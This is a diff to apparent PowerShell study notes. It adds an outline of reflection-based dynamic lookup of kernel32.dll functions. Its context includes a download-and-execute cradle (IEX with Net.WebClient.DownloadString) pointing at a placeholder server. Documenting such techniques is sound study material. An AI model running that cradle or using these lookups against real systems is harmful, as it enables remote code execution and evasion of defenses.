@@ -147,6 +147,20 @@ IEX (New-Object Net.WebClient).DownloadString("http://server/script.ps1")
 [appdomain]::CreateDomain("PluginDomain");  
 ```
 
+
+### Dynamic lookup (Powershell Reflection)
+
+
+```
+1. Find where kernel32.dll is loaded in memory
+        ↓
+2. Find the address of a specific exported function
+        ↓
+3. Convert that address into something .NET can call
+        ↓
+4. Call it
+```
+
 ## Resources
 
 - [Microsoft PowerShell Docs](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/03-discovering-objects?view=powershell-7.4)
